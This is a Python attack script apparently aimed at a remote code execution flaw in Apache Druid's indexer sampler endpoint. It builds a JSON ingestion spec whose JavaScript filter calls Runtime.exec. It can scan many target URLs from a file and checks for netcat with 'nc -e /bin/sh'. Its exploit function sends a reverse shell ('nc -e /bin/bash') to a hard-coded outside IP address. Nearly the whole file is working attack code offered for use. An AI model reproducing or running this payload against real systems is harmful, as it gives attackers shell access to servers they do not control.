# coding:utf-8
'''
 * @Author: w4nde3
 * @Date: 2021-02-25 10:53:53
 * @LastEditors: w4nde3
 * @LastEditTime: 2021-02-25 21:06:13
'''

import click
import requests
import json
import re
import time
import colorama
from colorama import init, Fore, Back, Style
init(autoreset=True)

requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent":
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-CN,en-US;q=0.7,en;q=0.3",
    "Content-Type": "application/json;charset=utf-8",
    "Connection": "close"
}
vuln_urls = []


def gen_detection_payload(payload):
    detection_payload = {
        "type": "index",
        "spec": {
            "ioConfig": {
                "type": "index",
                "inputSource": {
                    "type":
                    "inline",
                    "data":
                    "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat": {
                    "type": "json",
                    "keepNullColumns": True
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "timestampSpec": {
                    "column": "timestamp",
                    "format": "iso"
                },
                "dimensionsSpec": {},
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "dimension": "added",
                        "function":
                        "function(value) {java.lang.Runtime.getRuntime().exec('ping www.baidu.com')}",
                        "": {
                            "enabled": True,
                        }
                    }
                }
            },
            "type": "index",
            "tuningConfig": {
                "type": "index"
            }
        },
        "samplerConfig": {
            "numRows": 500,
            "timeoutMs": 15000
        }
    }
    detection_payload['spec']['dataSchema']['transformSpec']['filter'][
        'function'] = "function(value) {java.lang.Runtime.getRuntime().exec('" + str(
            payload) + "')}"
    return detection_payload


def preformat(url):
    if str(url).endswith('/'):
        pass
    else:
        url = str(url) + "/"
    pattern = re.compile(
        r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+/'
    )
    url_format = pattern.search(str(url))
    if url == url_format.group():
        return url_format.group()
    else:
        print("请检查测试的URL,示例：http://192.168.1.111:8888/")
        return None


def detection(url):
    print("当前正在测试：{}".format(url))
    url = str(url) + "druid/indexer/v1/sampler"

    try:

        res = requests.post(url=url,
                            headers=headers,
                            data=json.dumps(
                                gen_detection_payload("ping www.baidu.com")),
                            timeout=3,
                            verify=False)
        time.sleep(3)
        if res.status_code == 200:
            detection_nc(url)
        elif res.status_code == 400:
            if "Instantiation" in res.text:
                print('[-] 目标服务器没有创建/var/tmp目录,利用失败')
            elif "Failed to" in res.text:
                print('[-] 目标服务器未安装nc工具，利用失败')
        else:
            print('[-] 其他错误')
    except:
        print("[x] 漏洞不存在")
        pass


def detection_nc(url):
    print("[+] 存在漏洞,正在探测是否安装nc")

    try:
        res = requests.post(
            url=url,
            headers=headers,
            data=json.dumps(
                gen_detection_payload("nc -e /bin/sh 1.1.1.1 2333")),
            timeout=3,
            verify=False)
        time.sleep(3)
        if res.status_code == 200:
            print('\033[1;33;42m' '[√] 利用成功')
            vuln_urls.append(url.split("druid/indexer/v1/sample")[0])
    except:
        print("[x] nc探测出错，探测地址：{}".format(url))


def detection_from_file(file):
    try:
        with open(file, 'r') as urlsfrom:
            urls = [i.strip() for i in urlsfrom.readlines()]
            for url in urls:
                url = preformat(url)
                if url:
                    detection(url)

    except:
        print('[x] 文件打开失败')
        exit(1)


def exploit(url, ip="39.105.228.43", port=5432):
    res = requests.post(url=url,
                        headers=headers,
                        data=json.dumps(
                            gen_detection_payload(
                                "nc -e /bin/bash {} {}".format(ip,
                                                               str(port)))),
                        timeout=3,
                        verify=False)
    if res.status_code == 200:
        print("[√] 反弹成功")


@click.command()
@click.option("-u", "--url", help='目标URL: 如http://192.168.1.111:8888/')
@click.option("-f", "--file", help='目标文件: 包含URL的txt文件')
def main(url=None, file=None):
    if file:
        detection_from_file(file)
    else:
        url = preformat(url)
        detection(url)


if __name__ == '__main__':
    main()
    for url in vuln_urls:
        print(url)
